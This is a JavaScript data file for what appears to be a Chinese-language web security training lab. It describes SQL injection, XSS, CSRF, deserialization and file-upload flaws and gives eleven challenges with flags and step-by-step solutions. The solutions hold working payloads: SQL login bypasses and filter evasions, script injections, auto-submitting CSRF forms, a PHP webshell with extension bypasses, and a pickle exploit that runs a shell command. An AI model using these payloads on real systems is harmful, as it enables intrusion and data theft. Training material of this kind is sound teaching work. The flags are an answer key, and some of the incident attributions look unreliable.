export const categories = [
  { id: 'all', name: '全部漏洞', count: 11 },
  { id: 'sqli', name: 'SQL注入', count: 3 },
  { id: 'xss', name: 'XSS攻击', count: 3 },
  { id: 'csrf', name: 'CSRF攻击', count: 2 },
  { id: 'deserialization', name: '反序列化', count: 2 },
  { id: 'upload', name: '文件上传', count: 1 }
]

export const vulnTypes = {
  sqli: {
    name: 'SQL注入',
    icon: 'database',
    color: '#ef4444',
    description: 'SQL注入是一种通过在输入中注入恶意SQL语句来操纵数据库的攻击技术。',
    principles: [
      '应用程序直接将用户输入拼接到SQL语句中',
      '攻击者构造恶意输入绕过验证逻辑',
      '数据库执行恶意SQL导致数据泄露或篡改'
    ],
    impacts: [
      '数据泄露：获取敏感数据如用户名、密码',
      '数据篡改：修改或删除数据库记录',
      '权限提升：获取数据库管理员权限',
      '服务器控制：通过SQL注入执行系统命令'
    ],
    attackVectors: [
      { name: '登录绕过', description: "使用 ' OR 1=1-- 绕过登录验证" },
      { name: '数据枚举', description: "使用 UNION SELECT 联合查询获取数据" },
      { name: '盲注攻击', description: "通过布尔值或时间延迟判断数据" },
      { name: '堆叠查询', description: "执行多条SQL语句" }
    ],
    defenses: [
      '使用参数化查询（Prepared Statements）',
      '使用ORM框架避免直接SQL拼接',
      '对用户输入进行严格验证和过滤',
      '最小权限原则配置数据库用户',
      '部署Web应用防火墙（WAF）'
    ],
    examples: [
      {
        title: '登录绕过',
        vulnerable: "SELECT * FROM users WHERE username = '$username' AND password = '$password'",
        payload: "' OR '1'='1",
        result: "SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''"
      },
      {
        title: '联合查询',
        vulnerable: "SELECT name, email FROM users WHERE id = $id",
        payload: "1 UNION SELECT username, password FROM admin",
        result: "SELECT name, email FROM users WHERE id = 1 UNION SELECT username, password FROM admin"
      }
    ],
    realCases: [
      '2016年雅虎数据泄露事件，攻击者通过SQL注入获取5亿用户数据',
      '2019年Capital One数据泄露，通过SQL注入暴露1.06亿用户信息'
    ]
  },
  xss: {
    name: '跨站脚本攻击',
    icon: 'code',
    color: '#f59e0b',
    description: 'XSS攻击是指攻击者通过在Web页面中注入恶意脚本，当用户访问时执行恶意代码。',
    types: [
      { name: '反射型XSS', description: '恶意脚本通过URL参数传入，服务器反射给用户', severity: '中' },
      { name: '存储型XSS', description: '恶意脚本存储在服务器，所有访问者都会执行', severity: '高' },
      { name: 'DOM型XSS', description: '恶意脚本在客户端通过JavaScript动态执行', severity: '中' }
    ],
    impacts: [
      '窃取用户Cookie和Session信息',
      '劫持用户会话，冒充用户身份',
      '钓鱼攻击，诱导用户点击恶意链接',
      '传播恶意软件或勒索软件'
    ],
    attackVectors: [
      { name: '表单输入', description: '在表单中输入<script>恶意代码</script>' },
      { name: 'URL参数', description: '通过URL参数注入脚本' },
      { name: '富文本编辑器', description: '利用富文本编辑器漏洞插入脚本' },
      { name: 'HTML属性注入', description: "在属性中注入事件处理器如 onload='恶意代码'" }
    ],
    defenses: [
      '对用户输入进行HTML实体编码',
      '使用Content Security Policy（CSP）',
      '验证用户输入格式和长度',
      '使用安全的JavaScript框架自动转义',
      '设置HttpOnly和Secure Cookie属性'
    ],
    examples: [
      {
        title: '反射型XSS',
        vulnerable: "<div>搜索结果: userInput</div>",
        payload: "<script>alert('XSS')</script>",
        result: "<div>搜索结果: <script>alert('XSS')</script></div>"
      },
      {
        title: 'DOM型XSS',
        vulnerable: "document.getElementById('output').innerHTML = inputValue;",
        payload: "<img src=x onerror=alert('XSS')>",
        result: "innerHTML执行了恶意脚本"
      }
    ],
    realCases: [
      '2013年Twitter XSS漏洞，攻击者发布恶意推文影响大量用户',
      '2015年Facebook XSS漏洞，可被利用劫持用户会话'
    ]
  },
  csrf: {
    name: '跨站请求伪造',
    icon: 'shield-alert',
    color: '#3b82f6',
    description: 'CSRF攻击是指攻击者诱导用户在已登录状态下执行非预期操作的攻击方式。',
    principles: [
      '用户已登录目标网站，持有有效Session',
      '攻击者构造恶意链接或表单',
      '用户在不知情的情况下点击或提交',
      '服务器误认为是用户的合法请求'
    ],
    impacts: [
      '未经授权的操作如修改密码、转账',
      '数据删除或篡改',
      '账户被劫持或权限被修改',
      '执行恶意操作如发布不良内容'
    ],
    attackVectors: [
      { name: '恶意链接', description: '通过邮件或消息发送恶意URL' },
      { name: '隐藏表单', description: '在页面中嵌入自动提交的表单' },
      { name: '图片标签', description: "利用<img>标签发起GET请求" },
      { name: 'JSON劫持', description: '利用JSONP或CORS漏洞' }
    ],
    defenses: [
      '使用CSRF Token验证',
      '验证请求来源（Referer检查）',
      '使用SameSite Cookie属性',
      '对敏感操作要求重新验证身份',
      '使用POST方法处理敏感操作'
    ],
    examples: [
      {
        title: '恶意图片标签',
        vulnerable: "<img src='http://bank.com/transfer?to=attacker&amount=1000'>",
        payload: "在论坛发帖包含此图片",
        result: "用户浏览帖子时自动发起转账请求"
      },
      {
        title: '自动提交表单',
        vulnerable: "<form action='http://example.com/change_password' method='POST'>...</form>",
        payload: "页面加载时自动提交表单",
        result: "用户密码被修改"
      }
    ],
    realCases: [
      '2008年Gmail CSRF漏洞，可被利用添加恶意邮箱转发规则',
      '2012年GitHub CSRF漏洞，可被利用创建仓库和添加协作人员'
    ]
  },
  deserialization: {
    name: '反序列化漏洞',
    icon: 'package',
    color: '#8b5cf6',
    description: '反序列化漏洞是指攻击者通过构造恶意序列化数据，在反序列化过程中执行任意代码。',
    principles: [
      '应用程序接收序列化数据并反序列化',
      '攻击者构造恶意对象数据',
      '反序列化时触发对象的魔术方法',
      '恶意代码在服务器端执行'
    ],
    impacts: [
      '远程代码执行（RCE）',
      '服务器完全控制',
      '数据泄露',
      '权限提升'
    ],
    attackVectors: [
      { name: 'PHP反序列化', description: '利用__wakeup、__destruct等魔术方法' },
      { name: 'Java反序列化', description: '利用Apache Commons Collections等库的gadget链' },
      { name: 'Python反序列化', description: '利用pickle模块的漏洞' },
      { name: '.NET反序列化', description: '利用BinaryFormatter等反序列化器' }
    ],
    defenses: [
      '避免反序列化不可信数据',
      '使用白名单验证反序列化的类',
      '使用安全的序列化格式如JSON',
      '及时更新依赖库修复已知漏洞',
      '限制反序列化的权限'
    ],
    examples: [
      {
        title: 'PHP反序列化',
        vulnerable: "$obj = unserialize($_GET['data']);",
        payload: "O:8:\"User\":1:{s:8:\"username\";s:5:\"admin\";}",
        result: "恶意对象被反序列化并执行魔术方法"
      },
      {
        title: 'Java反序列化',
        vulnerable: "ObjectInputStream.readObject(inputStream);",
        payload: "构造包含恶意gadget链的序列化数据",
        result: "执行任意代码获取服务器控制"
      }
    ],
    realCases: [
      '2017年Apache Struts2 S2-045漏洞，影响大量企业应用',
      '2021年Log4j漏洞（虽然不是反序列化，但展示了序列化数据的危险）'
    ]
  },
  upload: {
    name: '文件上传漏洞',
    icon: 'upload',
    color: '#10b981',
    description: '文件上传漏洞是指攻击者通过上传恶意文件如WebShell来获取服务器控制权。',
    principles: [
      '应用程序允许用户上传文件',
      '未对文件类型、大小、内容进行有效验证',
      '上传的恶意文件可被执行',
      '攻击者获取服务器访问权限'
    ],
    impacts: [
      'WebShell上传获取服务器控制',
      '恶意软件传播',
      '文件覆盖导致数据丢失',
      '服务器被用作攻击跳板'
    ],
    attackVectors: [
      { name: '扩展名绕过', description: '修改文件扩展名如 .php -> .php.jpg' },
      { name: 'MIME类型绕过', description: '修改Content-Type头' },
      { name: '文件内容绕过', description: '在合法文件中嵌入恶意代码' },
      { name: '路径遍历', description: '通过../访问上级目录' }
    ],
    defenses: [
      '验证文件类型（白名单）',
      '验证文件内容（魔术字节检查）',
      '限制文件大小',
      '使用随机文件名',
      '将上传目录设置为不可执行',
      '使用文件存储服务如OSS'
    ],
    examples: [
      {
        title: '扩展名绕过',
        vulnerable: "只检查扩展名是否在允许列表中",
        payload: "shell.php%00.jpg",
        result: "文件名被截断，实际保存为shell.php"
      },
      {
        title: '内容验证绕过',
        vulnerable: "只检查文件头是否为图片",
        payload: "GIF89a<?php phpinfo(); ?>",
        result: "文件被识别为图片但包含PHP代码"
      }
    ],
    realCases: [
      '2017年Equifax数据泄露，通过文件上传漏洞入侵',
      '2020年某大型电商平台被上传WebShell导致数据泄露'
    ]
  }
}

export const vulnerabilities = [
  {
    id: 1,
    name: 'SQL注入-初级',
    type: 'sqli',
    difficulty: 'easy',
    summary: '学习基本的SQL注入概念，掌握登录绕过技巧',
    tags: ['入门', '登录绕过', '基础'],
    scenario: '登录页面存在SQL注入漏洞，尝试绕过登录验证',
    objective: '通过SQL注入绕过登录，获取管理员权限',
    hints: [
      '尝试在用户名输入框中输入特殊字符',
      "考虑使用 ' OR 1=1-- 这样的payload绕过登录",
      '登录成功后，尝试使用UNION查询获取flag',
      '数据库中有单独的flag表'
    ],
    flag: 'Mlai{sqli_easy_2026_get_flag}',
    solution: [
      '分析目标：登录表单使用GET方法提交，SQL语句直接拼接用户输入',
      '原始SQL：SELECT * FROM users WHERE username = \'$username\' AND password = \'$password\'',
      '第一步：登录绕过',
      '在用户名输入框输入：\' OR 1=1--',
      '执行的SQL：SELECT * FROM users WHERE username = \'\' OR 1=1--\' AND password = \'\'',
      '解释：\' 闭合username的引号，OR 1=1使条件永远为真，--注释掉后面内容',
      '密码框可以留空，提交后成功绕过登录验证',
      '第二步：获取flag',
      '数据库中有flag表存储真正的flag，需要使用UNION查询',
      '在用户名输入框输入：\' UNION SELECT 1,flag,3 FROM flag--',
      '执行的SQL：SELECT * FROM users WHERE username = \'\' UNION SELECT 1,flag,3 FROM flag--\' AND password = \'\'',
      '解释：UNION查询将flag表的数据合并到结果中，flag会显示在password字段位置',
      '登录成功后即可看到Flag: Mlai{sqli_easy_2026_get_flag}'
    ]
  },
  {
    id: 2,
    name: 'SQL注入-中级',
    type: 'sqli',
    difficulty: 'medium',
    summary: '学习绕过基础过滤的SQL注入技巧',
    tags: ['绕过过滤', '登录绕过', '中级'],
    scenario: '登录页面存在SQL注入漏洞，但有基础过滤',
    objective: '绕过过滤机制，成功登录',
    hints: [
      '测试哪些字符被过滤了',
      '尝试使用不同的注释方式',
      '可以使用内联注释/**/绕过'
    ],
    flag: 'Mlai{sqli_medium_bypass_comment}',
    solution: [
      '分析目标：页面使用str_replace过滤了 --、#、/* 等注释符',
      '原始SQL：SELECT * FROM users WHERE username = \'$username\' AND password = \'$password\'',
      '测试发现：--、#、/* 被替换为空，无法使用注释符绕过',
      '绕过方法：不使用注释符，直接闭合引号构造恒真条件',
      '在用户名输入框输入：\' OR \'1\'=\'1',
      '执行的SQL：SELECT * FROM users WHERE username = \'\' OR \'1\'=\'1\' AND password = \'\'',
      '解释：前一个\'闭合username的引号，OR \'1\'=\'1使条件永远为真',
      '密码框可以留空，提交后成功绕过登录验证',
      '使用UNION查询获取flag：\' UNION SELECT 1,flag,3 FROM flag',
      '执行后获取Flag: Mlai{sqli_medium_bypass_comment}'
    ]
  },
  {
    id: 3,
    name: 'SQL注入-高级',
    type: 'sqli',
    difficulty: 'hard',
    summary: '学习绕过高级过滤的SQL注入技巧',
    tags: ['高级过滤', '字符替换', '盲注'],
    scenario: '登录页面存在SQL注入漏洞，但有严格的关键词过滤',
    objective: '绕过严格过滤，成功登录',
    hints: [
      '测试哪些关键词被过滤',
      '尝试大小写混合绕过',
      '可以使用字符编码或内联注释'
    ],
    flag: 'Mlai{sqli_hard_double_write_bypass}',
    solution: [
      '分析目标：页面使用preg_replace不区分大小写过滤了 union, select, or, and, --, #, /*, */等关键词',
      '原始SQL：SELECT * FROM users WHERE username = \'$username\' AND password = \'$password\'',
      '测试发现：or, and, --, #等关键词都被过滤（不区分大小写）',
      '注意：注释符--和#也被过滤，无法使用注释绕过',
      '绕过方法1 - 双写绕过：在用户名输入框输入 \' oorr \'1\'=\'1',
      '过滤后：\' or \'1\'=\'1，双写的oorr被过滤后还原为or',
      '执行的SQL：SELECT * FROM users WHERE username = \'\' or \'1\'=\'1\' AND password = \'\'',
      '绕过方法2 - 使用其他逻辑运算符：\' || \'1\'=\'1',
      'MySQL中||等价于OR，不在过滤列表中',
      '执行的SQL：SELECT * FROM users WHERE username = \'\' || \'1\'=\'1\' AND password = \'\'',
      '绕过方法3 - 使用十六进制编码：\' || 0x31=0x31',
      '0x31是数字1的十六进制表示，不在过滤列表中',
      '使用UNION查询获取flag：\' uniionn sselectt 1,flag,3 from flag',
      '双写的union和select被过滤后还原为正常关键词',
      '执行后获取Flag: Mlai{sqli_hard_double_write_bypass}'
    ]
  },
  {
    id: 4,
    name: '反射型XSS',
    type: 'xss',
    difficulty: 'easy',
    summary: '学习反射型XSS攻击原理',
    tags: ['反射型', 'URL参数', '入门'],
    scenario: '搜索功能存在XSS漏洞，输入会直接显示在页面上',
    objective: '通过XSS注入获取页面中的flag',
    hints: [
      '尝试在搜索框中输入<script>标签',
      '调用页面中已定义的函数',
      '注意特殊字符的编码'
    ],
    flag: 'Mlai{xss_reflected_flag}',
    solution: [
      '分析目标：搜索功能的输入会直接输出到页面，没有任何过滤',
      '页面中已定义showFlag()函数可以弹出flag',
      '在搜索框输入：<script>showFlag()</script>',
      '或者通过URL参数：?data=<script>showFlag()</script> 或 ?x=<script>showFlag()</script>',
      '提交表单或访问URL后，脚本直接执行',
      'showFlag()函数被调用，弹出Flag: Mlai{xss_reflected_flag}',
      '成功获取flag'
    ]
  },
  {
    id: 5,
    name: '存储型XSS',
    type: 'xss',
    difficulty: 'medium',
    summary: '学习存储型XSS攻击，恶意代码持久化存储',
    tags: ['存储型', '持久化', '留言板'],
    scenario: '留言板功能存在XSS漏洞，留言会被存储并显示',
    objective: '注入恶意脚本并获取flag',
    hints: [
      '在留言框中输入恶意脚本',
      '脚本会在所有访问者页面执行',
      '可以窃取其他用户的信息'
    ],
    flag: 'Mlai{xss_stored_flag}',
    solution: [
      '分析目标：留言板功能将用户输入追加存储到/tmp/messages.txt并直接输出',
      '页面中已定义showFlag()函数可以弹出flag',
      '在留言框输入：<script>showFlag()</script>',
      '提交留言后，脚本被存储到/tmp/messages.txt文件中',
      '每次有人访问页面，服务器会读取文件内容并直接输出',
      '存储的脚本在所有访问者的浏览器中执行',
      '脚本执行后调用showFlag()函数弹出Flag: Mlai{xss_stored_flag}',
      '成功获取flag'
    ]
  },
  {
    id: 6,
    name: 'DOM型XSS',
    type: 'xss',
    difficulty: 'medium',
    summary: '学习DOM型XSS攻击，了解客户端漏洞',
    tags: ['DOM型', '客户端', 'innerHTML'],
    scenario: '页面使用innerHTML动态更新内容，存在XSS风险',
    objective: '通过DOM注入获取flag',
    hints: [
      '查看页面源代码了解JavaScript逻辑',
      '尝试在输入框中注入脚本',
      '注意innerHTML不会执行<script>标签，可以使用其他方式'
    ],
    flag: 'Mlai{xss_dom_flag}',
    solution: [
      '分析目标：页面使用innerHTML动态更新内容，没有任何服务端过滤',
      '页面中已定义showFlag()函数可以弹出flag',
      '注意：innerHTML不会执行<script>标签，但会执行HTML事件处理器',
      '在输入框输入：<img src=x onerror=showFlag()>',
      '或者使用：<svg onload=showFlag()> 或 <body onload=showFlag()>',
      '点击按钮触发showOutput()函数',
      'innerHTML将输入内容插入到页面DOM中',
      'img标签加载失败触发onerror事件，执行showFlag()函数',
      '弹出Flag: Mlai{xss_dom_flag}',
      '成功获取flag'
    ]
  },
  {
    id: 7,
    name: 'PHP反序列化',
    type: 'deserialization',
    difficulty: 'hard',
    summary: '学习PHP反序列化漏洞的原理和利用',
    tags: ['PHP', '魔术方法', '代码执行'],
    scenario: '应用程序存在反序列化漏洞，可以执行任意代码',
    objective: '构造恶意序列化数据获取flag',
    hints: [
      '了解PHP魔术方法如__wakeup、__destruct',
      '需要找到可利用的类',
      '可以使用工具生成payload'
    ],
    flag: 'Mlai{PHP-Deserialization-Success}',
    solution: [
      '分析目标：应用程序直接使用unserialize()处理用户提交的POST数据',
      '查看源代码，发现FileReader类有__destruct魔术方法',
      '__destruct方法会读取filename属性指定的文件并输出',
      '构造FileReader对象，设置filename为/var/www/html/flag.txt',
      '生成序列化数据：O:10:"FileReader":1:{s:8:"filename";s:24:"/var/www/html/flag.txt";}',
      '将payload粘贴到输入框并提交',
      '服务器执行unserialize()反序列化数据，创建FileReader对象',
      '脚本执行结束时对象被销毁，触发__destruct方法',
      '__destruct读取flag文件并输出Flag: Mlai{PHP-Deserialization-Success}',
      '成功获取flag'
    ]
  },
  {
    id: 8,
    name: '文件上传',
    type: 'upload',
    difficulty: 'medium',
    summary: '学习文件上传漏洞的各种绕过技巧',
    tags: ['文件上传', 'WebShell', '绕过'],
    scenario: '文件上传功能存在漏洞，可以上传恶意文件',
    objective: '上传WebShell并获取flag',
    hints: [
      '尝试上传不同扩展名的文件',
      '检查服务器是否检查文件内容',
      '可以尝试修改文件头绕过检测'
    ],
    flag: 'Mlai{file_upload_flag}',
    solution: [
      '分析目标：文件上传功能只允许jpg, png, gif扩展名，使用pathinfo检查',
      '创建PHP文件：<?php echo file_get_contents(\'/var/www/html/flag.txt\'); ?>',
      '保存为shell.php',
      '尝试直接上传会被拦截，提示只允许图片文件',
      '绕过方法1 - 双重扩展名：将文件名改为shell.php.jpg',
      '绕过方法2 - 使用服务器支持的其他PHP扩展名：shell.phtml 或 shell.php5',
      '绕过方法3 - 图片马：在PHP代码前添加GIF头 GIF89a',
      '例如：GIF89a<?php echo file_get_contents(\'/var/www/html/flag.txt\'); ?>',
      '将文件保存为shell.gif或shell.jpg',
      '上传成功后访问：http://target/uploads/shell.gif',
      '如果服务器配置允许，会解析执行PHP代码显示Flag: Mlai{file_upload_flag}',
      '成功获取flag'
    ]
  },
  {
    id: 9,
    name: 'CSRF-Easy',
    type: 'csrf',
    difficulty: 'easy',
    summary: '学习CSRF攻击的基本原理',
    tags: ['CSRF', '入门', '跨站请求'],
    scenario: '网站缺少CSRF防护，可以构造恶意请求',
    objective: '利用CSRF漏洞执行非授权操作',
    hints: [
      '找到敏感操作的接口',
      '构造恶意链接或表单',
      '诱导用户点击或访问'
    ],
    flag: 'Mlai{CSRF-Easy-Success}',
    solution: [
      '分析目标：修改密码功能没有任何CSRF防护，没有Token验证',
      '页面有一个表单，POST提交password参数到当前页面',
      '构造恶意HTML页面（可保存在攻击者服务器）：',
      '<html>',
      '<body onload="document.forms[0].submit()">',
      '<form action="http://target/csrf-easy/" method="POST">',
      '<input type="hidden" name="password" value="hacked!"/>',
      '</form>',
      '</body>',
      '</html>',
      '诱导已登录用户点击链接或自动访问该页面',
      '用户浏览器自动发送POST请求，密码被修改为"hacked!"',
      '访问 http://target/csrf-easy/?get_flag 获取Flag: Mlai{CSRF-Easy-Success}',
      '成功获取flag'
    ]
  },
  {
    id: 10,
    name: 'CSRF-Hard',
    type: 'csrf',
    difficulty: 'hard',
    summary: '学习高级CSRF绕过技术',
    tags: ['CSRF', '高级', '绕过'],
    scenario: '网站有基本的CSRF防护，但存在绕过方法',
    objective: '绕过CSRF防护执行恶意操作',
    hints: [
      '分析CSRF Token的生成方式',
      '尝试获取或伪造Token',
      '考虑使用XSS配合CSRF'
    ],
    flag: 'Mlai{CSRF-Hard-Success}',
    solution: [
      '分析目标：网站使用Referer验证，检查Referer是否包含当前主机名',
      '验证逻辑：if (empty($referer) || strpos($referer, $host) === false)',
      '绕过思路：构造包含目标主机名的Referer即可',
      '方法1 - 使用iframe：在恶意页面中嵌入目标网站的页面',
      '<iframe src="http://target/csrf-hard/" style="display:none"></iframe>',
      '<script>frames[0].document.forms[0].password.value="hacked!";frames[0].document.forms[0].submit();</script>',
      '方法2 - 构造特殊Referer：让Referer包含目标域名',
      '例如在攻击者网站放置图片：<img src="http://target/csrf-hard/?x=1">',
      '然后在Referer中包含 target 字符串',
      '方法3 - 使用本地HTML文件：打开本地HTML文件，用script发起请求',
      '由于是file://协议，某些浏览器会保留referer',
      '成功将密码修改为"hacked!"后，访问 ?get_flag 获取Flag: Mlai{CSRF-Hard-Success}',
      '成功获取flag'
    ]
  },
  {
    id: 11,
    name: 'Python反序列化',
    type: 'deserialization',
    difficulty: 'hard',
    summary: '学习Python反序列化漏洞的利用',
    tags: ['Python', 'pickle', '代码执行'],
    scenario: '应用程序使用pickle反序列化不可信数据',
    objective: '构造恶意pickle数据执行代码',
    hints: [
      '了解Python pickle模块的工作原理',
      '构造恶意类或函数',
      '使用__reduce__方法执行代码'
    ],
    flag: 'Mlai{Python-Deserialization-Success}',
    solution: [
      '分析目标：应用程序先base64解码用户输入，再使用pickle.loads()反序列化',
      '服务器端已定义FlagReader类，__reduce__方法执行os.system("cat /flag.txt")',
      '构造恶意类，在__reduce__方法中返回执行命令的元组',
      '编写Python代码生成payload：',
      'import pickle',
      'import base64',
      'import os',
      'class Exploit:',
      '    def __reduce__(self):',
      '        return (os.system, ("cat /flag.txt",))',
      'payload = base64.b64encode(pickle.dumps(Exploit())).decode()',
      '或者直接使用服务器端已有的FlagReader类',
      '将生成的payload粘贴到输入框并提交',
      '服务器先base64解码，再执行pickle.loads()反序列化',
      '__reduce__方法被调用，执行系统命令cat /flag.txt',
      '成功获取Flag: Mlai{Python-Deserialization-Success}'
    ]
  }
]
